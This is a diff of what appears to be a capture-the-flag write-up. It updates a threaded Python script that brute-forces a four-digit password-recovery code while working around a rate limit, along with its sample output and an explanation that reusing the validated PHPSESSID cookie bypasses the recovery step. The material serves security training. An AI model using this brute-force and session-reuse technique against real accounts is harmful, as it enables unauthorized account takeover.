@@ -252,40 +252,37 @@ def send_recovery_code_request(session, start, end):
             's': '170'
         }
         try:
-            if not stop_event.is_set():
+            # Send POST request with modified headers
+            response = session.post(url=OTP_URL, data=data, headers=local_headers)
 
-                # Send POST request with modified headers
-                response = session.post(url=OTP_URL, data=data, headers=local_headers)
+            # Check if the time limit has reached for providing the code
+            location_header = response.headers.get('Location', '')
+            if "Time elapsed" in location_header:
+                print("Time elapsed. Please try again later.")
+                stop_event.set()
+                break
 
-                # Check if the time limit has reached for providing the code
-                location_header = response.headers.get('Location', '')
-                if "Time elapsed" in location_header:
-                    print("Time elapsed. Please try again later.")
+            if response.status_code == 200:
+                print(f"Rate Limit: {response.headers.get('Rate-Limit-Pending')} | Cookie: {session.cookies}")
+
+                soup = BeautifulSoup(response.text, "html.parser")
+
+                # Look for the Error and Success indicators. If the code is invalid, an HTML tag containing an error message with the class "alert"
+                # will show on the page. if we find that tag mean the code is invalid.
+                # Otherwise, the code is valid, and the page will be updated, and a field for NEW_PASSWORD and CONFIRM_PASSWORD will be added
+                # [IMPORTANT]: Even if the page is updated with a new password field upon valid code entry, the error message
+                # for the invalid code of previous attempts will still be on the page.
+                invalid_code_tag = soup.find(class_="alert")
+                new_password_tag = soup.find(id="new_password")
+
+                if new_password_tag != None:
                     stop_event.set()
-                    break
+                    print(f"[VALID] recovery code found {code}")
+                    return code
 
-                if response.status_code == 200:
-                    print(f"Rate Limit: {response.headers.get('Rate-Limit-Pending')} | Cookie: {session.cookies}")
-
-                    soup = BeautifulSoup(response.text, "html.parser")
-
-                    # Look for Error and Success indicator. If code is invalid an HTML tag containing an error message having the class "alert"
-                    # will show on the page. if we find that tag mean the code is invalid.
-                    # Otherwise is the code is valid, and the page will updated and a field for NEW_PASSWORD and CONFIRM_PASSWORD
-                    # [IMPORTANT]: Even if the page updated with new password field upon valid code entry, the error message
-                    # for the invalid code of previous attempts will still be on the page.
-                    invalid_code_tag = soup.find(class_="alert")
-                    new_password_tag = soup.find(id="new_password")
-
-                    if new_password_tag != None:
-                        stop_event.set()
-                        print(f"[VALID] recovery code found {code}")
-                        return code
-
-                    if invalid_code_tag != None:
-                        if "Invalid or expired recovery code!" in invalid_code_tag.text:
-                            print(f"invalid recovery code {code}")
-
+                if invalid_code_tag != None:
+                    if "Invalid or expired recovery code!" in invalid_code_tag.text:
+                        print(f"invalid recovery code {code}")
 
         except Exception as e:
             print(f"[ERROR] could not brute force recovery code!")
@@ -332,9 +329,10 @@ def brute_force_recovery_code():
             try:
                 recovery_code = future.result()
                 if recovery_code:
-                    print(f"[SUCCESS] recovery code found {recovery_code}")
+                    print(f"[SUCCESS] recovery code found")
                     stop_event.set()
                     executor.shutdown(cancel_futures=True)
+                    break
             except Exception as e:
                 # On Error stop all threads and cancel remaining tasks
                 stop_event.set()
@@ -349,44 +347,61 @@ When you run this Python script, the output will be like this
 
 ```
 Brute force starting ...
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-invalid recovery code 2000
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-invalid recovery code 6000
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-invalid recovery code 7000
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-invalid recovery code 9000
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-invalid recovery code 8000
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
 invalid recovery code 0000
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 1000
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 5000
+invalid recovery code 0001
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 1001
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 5001
+invalid recovery code 0002
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 1002
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 5002
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 0003
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 1003
+
 
 ...
 ...
 ...
 
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-[VALID] recovery code found 0009
-invalid recovery code 2013
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 1256
 Brute force attack done ...
-invalid recovery code 9014
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
+[VALID] recovery code found 7169
+invalid recovery code 8071
+invalid recovery code 5220
 Brute force attack done ...
-Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=nvtcul08kl2l7td30nel5godmn for 10.48.178.123/>]>
-[VALID] recovery code found 3010
-[VALID] recovery code found 5003
-[VALID] recovery code found 7015
-[VALID] recovery code found 1014
-[VALID] recovery code found 8014
-
+invalid recovery code 4154
+Brute force attack done ...
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 0232
+[SUCCESS] recovery code found
+Brute force attack done ...
+Brute force attack done ...
+invalid recovery code 6248
+Brute force attack done ...
+Rate Limit: 9 | Cookie: <RequestsCookieJar[<Cookie PHPSESSID=3iqqbjgftli2tulikmhno2sm7u for 10.48.154.92/>]>
+invalid recovery code 9164
+Brute force attack done ...
 ```
 
-Even though it found multiple valid recovery codes, it doesn't really matter. Because when the script actually finds a valid recovery code, it already validates the code with the server and the `PHPSESSID`, and the session is updated.
+We have found a valid recovery code, but at this point, it doesn't really matter. Because when the script finds a valid recovery code, it already validates the code with the server, the `PHPSESSID` as well as the request session is updated.
 
-So what is important for us now is the `PHPSESSID`. In fact, if you just update the PHPSESSID in the cookie and put whatever code you want, and then reload the page, you will successfully bypass the recovery code and be prompted to enter a new password.
+So what is important for us now is the `PHPSESSID`. In fact, if you just update the PHPSESSID in the cookie and put whatever code you want or keep it blank, and then reload the page, you will successfully bypass the recovery code.
+
+![cookie change](./cookie_change.png)
 
 After resetting the password, you can login into the dashboard page. The answer for Q1 shall be there.
 
